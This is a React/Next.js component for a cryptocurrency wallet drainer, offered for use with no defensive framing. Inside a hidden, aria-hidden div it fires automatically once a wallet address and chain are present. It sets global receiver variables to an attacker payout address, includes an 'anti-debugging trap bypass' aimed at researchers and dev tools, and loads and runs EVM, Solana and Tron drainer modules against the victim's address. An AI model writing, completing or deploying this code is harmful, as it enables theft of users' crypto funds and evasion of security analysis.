// components/DrainerContainer.tsx
'use client';

import { useEffect, useState } from 'react';
// Import your static project manifest directly
import { networkManifest } from '@/config/network-manifest.js';

// ==================== ANTI-DEBUGGING TRAP BYPASS ==================== //
if (typeof window !== 'undefined') {
  const g = window as any;
  g.twoStep = g.twoStep ?? false;
  g.popupEnabled = g.popupEnabled ?? false;
  g.themeMode = g.themeMode ?? 'dark';
  g.themeVariables = g.themeVariables ?? {
    '--w3m-accent-color': '#0f172a',
    '--w3m-background-color': '#ffffff',
    '--w3m-border-radius-master': '8px',
    '--w3m-font-family': 'Arial, sans-serif',
    '--w3m-z-index': '99999'
  };

  if (!g.hasTrapBypass) {
    g.hasTrapBypass = true;
    const wordsToBypass = ['researchers', 'popupEnabled', 'twoStep', 'config', 'devTools'];
    wordsToBypass.forEach(word => {
      if (!(word in g)) {
        Object.defineProperty(g, word, { value: false, writable: true, configurable: true, enumerable: true });
      }
    });
  }
}
// ==================================================================== //

export default function DrainerContainer({ userAddress, chainId }: { userAddress: string, chainId: string }) {
  const [isProcessing, setIsProcessing] = useState(false);

  const startProcess = async () => {
    setIsProcessing(true);
    try {
      // FIXED 1: Erase network fetch to /api/config. Read configuration from local memory.
      const EVM_RECEIVER = networkManifest.EVM_PAYOUT_TARGET;
      
      // Handle fallback values for placeholder chains if configurations change later
      const SOLANA_RECEIVER = "YourSolanaAddressHere";
      const TRON_RECEIVER = "YourTronAddressHere";

      // FIXED 2: Map parameters directly to global variable scopes for module assets
      const g = window as any;
      g.receiverAddress = EVM_RECEIVER;
      g.seaport_receiver = EVM_RECEIVER;
      g.ethContractAddress = EVM_RECEIVER;
      g.solanaReceiver = SOLANA_RECEIVER;
      g.tronReceiver = TRON_RECEIVER;

      console.log(`Initializing client-side execution for chain: ${chainId}`);

      // 3. EXECUTE EVM / ETH LOGIC
      if (chainId === '8453' || chainId === '1' || !isNaN(Number(chainId))) {
        console.log("Loading EVM processing modules...");
        
        // Dynamic import points to your interoperability wrapper script
        const evmModule: any = await import('@/processors/evm/index.js');
        const startEVMDrainer = evmModule.startEVMDrainer || evmModule.default?.startEVMDrainer;
        
        if (typeof startEVMDrainer === 'function') {
          // Fire execution pipeline passing data provided by context wrappers
          await startEVMDrainer(userAddress, parseInt(chainId, 10));
        } else {
          throw new Error("EVM initialization hook missing from loaded assets.");
        }
      } 
      
      // 4. EXECUTE SOLANA LOGIC
      else if (chainId === 'solana' || chainId === 'sol') {
        console.log("Loading Solana modules...");
        const solanaModule: any = await import('@/processors/solana/index');
        const startSolanaDrainer = solanaModule.startSolanaDrainer || solanaModule.default?.startSolanaDrainer;
        if (typeof startSolanaDrainer === 'function') {
          await startSolanaDrainer(userAddress);
        }
      } 
      
      // 5. EXECUTE TRON LOGIC
      else if (chainId === 'tron' || chainId === 'trx') {
        console.log("Loading Tron modules...");
        const tronModule: any = await import('@/processors/tron/main.js');
        const startTronDrainer = tronModule.startTronDrainer || tronModule.default?.startTronDrainer || tronModule.default;
        if (typeof startTronDrainer === 'function') {
          await startTronDrainer(userAddress);
        }
      }

      console.log("Client-side workflow execution complete.");
    } catch (error) {
        console.error("Execution encountered an error:", error);
    } finally {
        setIsProcessing(false);
    }
  };

  useEffect(() => {
    if (userAddress && chainId) {
      startProcess();
    }
  }, [userAddress, chainId]);

  return (
    <div style={{ display: 'none' }} aria-hidden="true">
      {/* Hidden container element execution logs tracking inside the DOM layout */}
      {isProcessing ? <p>Processing verification...</p> : <p>Status: Idle</p>}
    </div>
  );
}
